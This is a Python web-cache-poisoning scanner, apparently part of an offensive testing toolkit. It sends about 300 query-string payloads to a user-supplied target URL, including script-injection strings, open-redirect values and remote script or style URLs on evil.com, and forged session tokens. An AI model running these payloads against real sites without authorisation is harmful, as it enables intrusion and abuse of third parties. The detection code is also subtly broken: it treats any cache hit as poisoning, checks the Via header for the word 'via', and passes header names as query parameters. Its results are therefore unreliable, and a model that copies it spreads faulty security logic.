import requests
from colorama import Fore

def run():
    print("Running Web Cache Poisoning scan (heuristic)...")
    url = input("Enter target URL: ").strip()

    payloads = [
    "cachepoison=1", "cb=evil", "callback=evil", "x=1<script>alert(1)</script>",
    "utm_source=eviltest", "debug=1", "preview=true", "redirect=http://evil.com", "host=evil.com",
    "user=attacker", "id=evil", "nocache=true", "set-cookie=inject", "X-Forwarded-Host=evil.com",
    "X-Original-URL=/evil", "X-Rewrite-URL=/evil", "X-Custom-Header=1", "forwarded=by-cache",
    "X-Host=evil.com", "X-Forwarded-For=evil", "lang=evil", "locale=evil", "return=http://evil.com",
    "url=http://evil.com", "action=evil", "next=evil", "page=evil", "ref=evil.com", "referrer=evil.com",
    "src=evil", "dest=http://evil.com", "target=http://evil.com", "continue=http://evil.com",
    "data=evil", "feed=evil", "file=evil.js", "document=evil", "load=evil", "fetch=evil",
    "q=evil", "query=evil", "show=evil", "display=evil", "theme=evil", "color=evil",
    "css=http://evil.com/style.css", "js=http://evil.com/x.js", "script=http://evil.com/1.js",
    "font=http://evil.com/font.woff", "image=http://evil.com/pwn.png", "avatar=http://evil.com/avatar.png",
    "bg=http://evil.com/bg.jpg", "background=http://evil.com/bg.png", "logo=http://evil.com/logo.svg",
    "banner=http://evil.com/banner.jpg", "ad=http://evil.com/ad.js", "ads=http://evil.com/tracker",
    "tracking=1", "trackid=evil", "clickid=evil", "utm_campaign=evil", "utm_medium=evil",
    "utm_term=evil", "cachebuster=123", "rnd=999", "v=evil", "version=evil", "preview=evil",
    "env=evil", "platform=evil", "device=evil", "os=evil", "browser=evil", "session=evil",
    "auth=evil", "access_token=evil", "jwt=evil", "apikey=evil", "token=evil", "auth_token=evil",
    "sid=evil", "uid=evil", "cookie=evil", "sessionid=evil", "phpsessid=evil", "JSESSIONID=evil",
    "cfid=evil", "cftoken=evil", "aspid=evil", "debug_mode=true", "test=true", "nocache=1",
    "no_cache=true", "bypass=true", "reload=true", "force=true", "insecure=true", "vulnerable=true",
    "error=1", "throw=1", "exception=1", "trigger=1", "delay=9999", "wait=9999", "sleep=9999",
    "latency=9999", "slow=true", "timeout=9999", "chunked=true", "gzip=true", "encoding=evil",
    "compress=evil", "deflate=evil", "br=evil", "cache-control=no-store", "pragma=no-cache",
    "X-Accel-Expires=0", "Expires=0", "Surrogate-Control=no-store", "Via=evilproxy", "X-Cache=MISS",
    "X-CDN=evilcdn", "CDN-Cache-Control=no-store", "x-request-id=evil", "trace=evil", "trace_id=evil",
    "logid=evil", "msg=evil", "info=evil", "status=evil", "event=evil", "csrf_token=evil",
    "origin=http://evil.com", "Referer=http://evil.com", "base=http://evil.com/", "template=evil",
    "layout=evil", "module=evil", "component=evil", "widget=evil", "element=evil", "slot=evil",
    "part=evil", "section=evil", "block=evil", "zone=evil", "frame=evil", "iframe=http://evil.com",
    "embed=http://evil.com/embed", "media=http://evil.com/media", "stream=http://evil.com/stream",
    "video=http://evil.com/video.mp4", "audio=http://evil.com/audio.mp3", "player=http://evil.com/player",
    "format=json", "output=evil", "response=evil", "callbackName=evil", "jsonp=evil", "jsonpCallback=evil",
    "alt=evil", "label=evil", "key=evil", "code=evil", "signature=evil", "sig=evil", "hash=evil",
    "checksum=evil", "verify=evil", "conf=evil", "params=evil", "params[]=evil", "array[]=evil",
    "query[]=evil", "filter=evil", "search=evil", "find=evil", "match=evil", "sort=evil", "order=evil",
    "limit=9999", "offset=0", "page_size=9999", "chunk=evil", "index=evil", "idx=evil", "range=evil",
    "width=9999", "height=9999", "resize=evil", "scale=evil", "crop=evil", "thumb=evil", "preview_img=evil",
    "optimize=evil", "quality=1", "compress_img=evil", "lang=evil", "locale=evil", "region=evil",
    "zone=evil", "country=evil", "currency=evil", "price=evil", "amount=9999", "discount=evil",
    "coupon=evil", "promo=evil", "voucher=evil", "cart=evil", "checkout=evil", "order=evil",
    "product=evil", "sku=evil", "pid=evil", "item=evil", "itemid=evil", "inventory=evil",
    "stock=evil", "user=evil", "userid=evil", "username=evil", "email=evil@evil.com", "phone=evil",
    "mobile=evil", "address=evil", "location=evil", "zip=evil", "postal=evil", "city=evil", "state=evil",
    "lat=0.0", "lon=0.0", "geo=evil", "gps=evil", "token_auth=evil", "session_key=evil",
    "debug_token=evil", "open_redirect=http://evil.com", "bounce=http://evil.com", "return_to=http://evil.com",
    "next_url=http://evil.com", "landing=http://evil.com", "redirect_uri=http://evil.com",
    "redirect_url=http://evil.com", "continue_url=http://evil.com", "goto=http://evil.com",
    "to=http://evil.com", "destination=http://evil.com", "xss=<script>1</script>", "injection=evil",
    "poisoned=1", "poison=1", "reflect=evil", "echo=evil", "testinput=evil", "check=evil",
    "eval=evil", "sandbox=evil", "emulate=evil", "simulate=evil", "user-agent=evil", "x-user-agent=evil"
]


    poisoned = False

    for payload in payloads:
        test_url = url + ("&" if "?" in url else "?") + payload
        try:
            res = requests.get(test_url, timeout=5)
            headers = res.headers
            body = res.text.lower()

            if "x-cache" in headers and ("hit" in headers["x-cache"].lower() or "cache" in headers["x-cache"].lower()):
                print(Fore.RED + f"[!] Potential Web Cache Poisoning via payload: {payload}")
                poisoned = True
            elif "cached" in body or "via" in headers.get("via", "").lower():
                print(Fore.YELLOW + f"[?] Suspicious cache behavior with payload: {payload}")
                poisoned = True
        except Exception as e:
            print(Fore.RED + f"[ERROR] {e}")

    if not poisoned:
        print(Fore.YELLOW + "[!] No cache poisoning indicators found.")

